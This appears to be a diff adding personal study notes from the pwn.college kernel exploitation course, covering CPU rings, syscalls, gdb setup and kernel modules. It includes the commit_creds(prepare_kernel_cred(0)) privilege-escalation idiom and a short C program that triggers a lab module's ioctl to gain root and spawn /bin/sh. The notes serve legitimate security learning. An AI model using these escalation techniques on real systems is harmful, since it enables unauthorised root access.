@@ -1,0 +1,86 @@
+- hlt instruction: shuts CPU computation.
+- Special registers:
+	cr3 ( Control Register 3) controls the page table used to translate virtual addresses to physical addresses. Accessed using "mov"
+	MSR_LSTAR defined where the syscall instruction jumps to. Accessed using "wrmsr" and "rdmsr"
+
+Kernel:
+	Ring 0: The Kernel. Unrestricted, supervisor mode
+	Ring 1: Generally unused
+	Ring 2: Genearally unused ( device drivers )
+	Ring 3: Userspace, where we have been operating until now. Very restricted.
+
+Different types of OS models:
+In a monolithic kernel there is a single, unified kernel binary that handles all OS-level tasks. Drivers are libraries loaded into this binary.
+examples: Linux, FreeBSD
+
+In a microkernel, there is a tiny "core" binary that provides inter-process communication and barebone interactions with the hardware. Drivers are normal-ish userspace programs with slightly special privileges.
+examples: Minux, seL4
+
+In a hybrid kernel, microkernel features are combined with a
+monolithic component.
+examples: Windows (NT), MacOS
+
+Switching between rings:
+High-level overview:
+
+At bootup, in Ring 0, the kernel sets MSR_LSTAR to point to the syscall handler routine.
+When a userspace (Ring 3) process wants to interact with the kernel, it can call syscall.
+Privilege level switches to Ring 0.
+Control flow jumps to value of MSR_LSTAR.
+Return address saved to rcx.
+That's basically it! https://www.felixcloutier.com/x86/syscall 
+When the kernel is ready to return to userspace, it calls the
+appropriate return instruction (i.e., sysret for syscall).
+Privilege level switches to Ring 3.
+Control flow jumps to rcx.
+That's basically it!
+
+./build.sh
+./launch.sh on another terminal
+
+gdb:
+target remote :1234
+
+info break for disp breakpoints
+
+cat /proc/kallsym - all simbols addresses of kernel
+
+The kernel module ( .ko ) runs with the same privileges as the kernel.
+
+return -EINVAL; means they do nothing
+
+Kernel modules tipically:
+	1. reads data from userspace ( copy_from_user)
+	2. writes data to userspace ( copy_to_user )
+	3. returns to userspace
+
+Module loading:
+	# insmod mymodule.ko
+
+Listing Modules:
+	# lsmod
+
+Removing modules:
+	# rmmod mymodule
+
+if we pass NULL to the reference struc, it will give use a cred struct with root privs access..
+	*prepare_kerne_cret(struct task_struct *reference_task_struct)
+how to set:
+- once we have code execution on kernel we have to run: commit_creds(prepare_kernel_cred(0));
+
+Basic priv:
+###########
+#include <assert.h>
+int main()
+{
+	int fd = open("/proc/pwn-college-root", 0);
+	assert(fd > 0);
+	printf("BEFORE uid: %d\n", getuid());
+	ioctl(fd, PWN, 0x13371337);
+	printf("AFTER uid: %d\n", getuid());
+	execl("/bin/sh", "/bin/sh", 0);
+}
+
+gcc -static priv.c -o priv
+
+# REMEMBER: USE THE EXPLOITS AND GDB ON THE ./launch.sh NOT ON YOUR MACHINE ! #
